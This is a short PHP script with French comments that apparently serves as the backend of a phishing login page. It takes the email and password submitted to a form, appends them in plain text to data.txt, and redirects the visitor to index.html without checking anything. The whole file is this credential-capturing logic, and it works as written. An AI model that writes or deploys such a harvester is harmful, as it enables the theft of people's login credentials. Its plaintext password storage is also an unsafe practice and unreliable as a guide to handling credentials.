<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    
    // Chemin vers le fichier texte
    $file = 'data.txt';
    
    // Enregistrer les données dans le fichier
    file_put_contents($file, "Email: $email, Mot de passe: $password\n", FILE_APPEND);
    
    // Rediriger vers la page d'accueil ou afficher un message
    header('Location: index.html');
    exit();
}
?>
